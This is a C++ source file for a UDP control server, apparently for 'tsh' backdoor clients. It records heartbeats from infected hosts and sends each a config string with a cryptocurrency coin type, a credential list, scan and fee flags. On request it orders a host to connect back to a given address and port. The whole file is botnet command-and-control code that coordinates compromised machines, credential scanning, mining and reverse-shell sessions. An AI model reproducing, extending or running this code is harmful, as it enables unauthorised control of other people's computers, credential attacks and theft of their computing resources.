#include <stdio.h>
#include <signal.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#include <string>
#include <vector>

#include "tshUdpProxy.h"

#define MAXLINE 1024

static std::vector<TshClient> tshList;
static FILE *gLogFile;
int gVerbose = 0;

#define FeeKey "f"
#define CoinKey "c"
#define PasswdKey "pw"
#define SslTlsKey "s"
#define ScanKey "scan"

std::string gPayloadData = "user:passwd;user2:passwd2";
std::string gCurrType = "b";

#define log(fmt, arg...) \
do { \
	struct tm *tm; \
	time_t t = time(NULL); \
	tm = localtime(&t); \
	if (gLogFile) { \
		fprintf(gLogFile, "%d-%02d-%02d %02d:%02d:%02d " fmt "", \
		tm->tm_year + 1900, tm->tm_mon + 1, tm->tm_mday, tm->tm_hour, tm->tm_min, tm->tm_sec, \
		##arg);\
		fflush(gLogFile); \
	} \
} while(0)

int createHeartBeat(uint16_t port) {
	int sockfd;
	struct sockaddr_in servaddr;

	// Creating socket file descriptor
	if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0 ) {
		perror("socket creation failed");
		exit(EXIT_FAILURE);
	}
	
	memset(&servaddr, 0, sizeof(servaddr));
	
	// Filling server information
	servaddr.sin_family    = AF_INET;
	servaddr.sin_addr.s_addr = INADDR_ANY;
	servaddr.sin_port = htons(port);
	
	// Bind the socket with the server address
	if(bind(sockfd, (const struct sockaddr *)&servaddr, sizeof(servaddr)) < 0) {
		perror("bind failed");
		exit(EXIT_FAILURE);
	}

	return sockfd;
}

static inline std::string toIP(const struct sockaddr_in &clientAddr) {
	char str[INET_ADDRSTRLEN];
	inet_ntop(AF_INET, &(clientAddr.sin_addr), str, INET_ADDRSTRLEN);
	return str;
}
static inline uint16_t toPort(const struct sockaddr_in &clientAddr) {
	return htons(clientAddr.sin_port);
}
static inline std::string toLocalTime(const time_t t) {
	char str[100];
	struct tm *tm;
	tm = localtime(&t);
	sprintf(str, "%d-%02d-%02d %02d:%02d:%02d ",
			tm->tm_year + 1900, tm->tm_mon + 1, tm->tm_mday,
			tm->tm_hour, tm->tm_min, tm->tm_sec);
	return str;
}

void handleSendConnectionInfo(int udpServerSock, TshClient &targetObj) {
	struct tshProtocol *pdata = &targetObj.sendData;
	if (pdata->magic == 0)
		return;
	if(!udpSendPacket(udpServerSock, pdata, &targetObj.clientAddr)) {
		err("Error handle tsh session %d " IPBLabel " to conn [%d.%d.%d.%d:%d]\n",
			targetObj.counter,
			IPBValue(targetObj.clientAddr),
			__IP3(pdata->listen_ip), __IP2(pdata->listen_ip),
			__IP1(pdata->listen_ip), __IP0(pdata->listen_ip),
			__PORT(pdata->listen_port)
			);
	}
	pdata->magic = 0;
}

/**
 */
static inline std::string getResponseData() {
	bool isScan = 0;
	float fee = 0.05;
	bool isSslTls = true;

	char strbuf[10240];
	snprintf(strbuf, 10240, "%s=%s&%s=%s&%s=%d&%s=%.2f&%s=%d",
			 CoinKey, gCurrType.c_str(),
			 PasswdKey, gPayloadData.c_str(),
			 ScanKey, isScan ? 1 : 0,
			 FeeKey, fee,
			 SslTlsKey, isSslTls ? 1 : 0);
	return strbuf;
}

void handleSendPayloadToConnection(int udpServerSock, TshClient &targetObj) {
	std::string payload = getResponseData();
	struct tshProtocol header;
	header.magic = MAGIC;
	header.length = TSH_PROT_HEADER_LEN + (uint32_t)payload.length();
	header.type = UPD_PAYLOAD_DATA;

	struct sockaddr_in *toaddr = &targetObj.clientAddr;

	info("Send back session [%d] " IPBLabel " payload [%s]\n",
		 targetObj.counter,
		 IPBValue(targetObj.clientAddr),
		 payload.c_str());
	if (!udpSendPacketData(udpServerSock, toaddr, &header, payload.c_str())) {
		err("Error to send data to client " IPBLabel "\n", IPBValue(*toaddr));
	}
}

/**
 更新UDP数据包的更新时间和计数器
 */
void handleTshUdpHeartBeat(int udpServerSock, const struct sockaddr_in &srcAddr, tshProtocol &data) {
	for(TshClient &obj : tshList) {
		if (obj.isEqual(srcAddr)) {
			obj.counter++;
			obj.lastUpdate = time(NULL);
			if (obj.sendData.magic) {
				handleSendConnectionInfo(udpServerSock, obj);
			} else {
				handleSendPayloadToConnection(udpServerSock, obj);
			}
			return;
		}
	}

	TshClient newone;
	newone.clientAddr = srcAddr;
	tshList.push_back(newone);
	log("Enter " IPBLabel " %d\n", IPBValue(srcAddr), newone.counter);
	handleSendPayloadToConnection(udpServerSock, newone);

	for (auto it = tshList.begin(); it != tshList.end(); ++it) {
		TshClient &obj = *it;
		if (time(NULL) - obj.lastUpdate > MAX_ALIVE_SECONDS) {
			log("Leave " IPBLabel " %d\n", IPBValue(srcAddr), obj.counter);
			tshList.erase(it);
			return;
		}
	}
}

static inline TshClient * findTshClient(uint32_t ip, uint16_t port) {
	info("Handle tsh session ip [%d.%d.%d.%d:%d]\n",
		 __IP3(ip), __IP2(ip),
		 __IP1(ip), __IP0(ip),
		 __PORT(port)
		 );
	for(TshClient &obj : tshList) {
		info("Handle tsh session ip [%d.%d.%d.%d:%d]\n",
			 __IP3(obj.clientAddr.sin_addr.s_addr), __IP2(obj.clientAddr.sin_addr.s_addr),
			 __IP1(obj.clientAddr.sin_addr.s_addr), __IP0(obj.clientAddr.sin_addr.s_addr),
			 __PORT(obj.clientAddr.sin_port)
			 );
		if (obj.isEqual(ip, port)) {
			return &obj;
		}
	}
	return NULL;
}

void handleTshUdpConnection(int udpServerSock, struct sockaddr_in &srcAddr, tshProtocol &data) {
	TshClient *targetObj = findTshClient(data.conn_ip, data.conn_port);
	
	if (NULL == targetObj) {
		err("error to find connect %d.%d.%d.%d:%d\n",
			__IP3(data.conn_ip), __IP2(data.conn_ip),
			__IP1(data.conn_ip), __IP0(data.conn_ip),
			__PORT(data.conn_port));
		return;
	}

	struct tshProtocol senddata;
	senddata.magic = MAGIC;
	senddata.type = UPD_BACK_CONNECT;
	senddata.length = TSH_PROT_HEADER_LEN;
	senddata.listen_port = data.listen_port;
	senddata.listen_ip = data.listen_ip;
	
	// 需要发送的存于数据中
	// 注意可能会发送2次 连接时候发送一次, 等下次心态重新在发送一次
	// 但是对方连接只能一次 因为连接了, server port关闭监听端口了
	// 这样为了加快连接的速度和时间间隔
	targetObj->sendData = senddata;
	
	info("Handle tsh session %d " IPBLabel " to conn [%d.%d.%d.%d:%d]\n",
		 targetObj->counter,
		 IPBValue(targetObj->clientAddr),
		 __IP3(senddata.listen_ip), __IP2(senddata.listen_ip),
		 __IP1(senddata.listen_ip), __IP0(senddata.listen_ip),
		 __PORT(senddata.listen_port)
		 );
	if(!udpSendPacket(udpServerSock, &senddata, &targetObj->clientAddr)) {
		err("Error handle tsh session %d " IPBLabel " to conn [%d.%d.%d.%d:%d]\n",
			targetObj->counter,
			IPBValue(targetObj->clientAddr),
			__IP3(senddata.listen_ip), __IP2(senddata.listen_ip),
			__IP1(senddata.listen_ip), __IP0(senddata.listen_ip),
			__PORT(senddata.listen_port)
			);
	}
}

static inline std::string getCoinTypeByPool(const char *pdata) {
	return "b";
}

int run(int udpServerSock) {
	struct sockaddr_in srcAddr;
	
	while (true) {
		struct tshProtocol data;
		std::string payloadStr;
		if (!udpRecvPacketData(udpServerSock, &data, &srcAddr, payloadStr)) {
			continue;
		}
		
		if (data.magic != MAGIC) {
			continue;
		}
		debug("udp magic from " IPBLabel " %08x type %d len %d/%d [%s]\n", IPBValue(srcAddr), data.magic, data.type, data.length - TSH_PROT_HEADER_LEN, data.length, payloadStr.c_str());

		if (data.type & UPD_HEADBEAT) {
			gCurrType = "";
			if (data.type & UPD_PAYLOAD_DATA) {
				gCurrType = getCoinTypeByPool(payloadStr.c_str());
			}
			handleTshUdpHeartBeat(udpServerSock, srcAddr, data);
		} else if (data.type == UPD_TSH_CONNECT) {
			handleTshUdpConnection(udpServerSock, srcAddr, data);
		}
	}
	
	return 0;
}

void usage() {
	err("fail use\n");
	exit(1);
}

int main(int argc, char **argv) {
	int opt;
	const char *logfile;
	uint16_t udpPort = UDP_ProxyPort;

	while ((opt = getopt(argc, argv, "l:p:d:v")) != EOF) {
		switch(opt) {
			case 'l':
			{
				logfile = optarg;
				unlink(logfile);
				gLogFile = fopen(logfile, "a+");
				if (NULL == gLogFile) {
					log("Error to open logfile %s\n", logfile);
					exit(1);
				}
			}
				break;
			case 'p':
				udpPort = (uint16_t)atoi(optarg);
				break;
			case 'd':
				gPayloadData = optarg;
				break;
			case 'v':
				gVerbose = 1;
				break;
			default:
				usage();
				break;
		}
	}
	
	signal(SIGPIPE, SIG_IGN);
	signal(SIGHUP, SIG_IGN);

	int udpServerSock = createHeartBeat(udpPort);
	printf("create udp socket %d\n", udpServerSock);
	printf("udp port %d\n", udpPort);
	printf("udp payload %s\n", gPayloadData.c_str());
	run(udpServerSock);
	return 0;
}
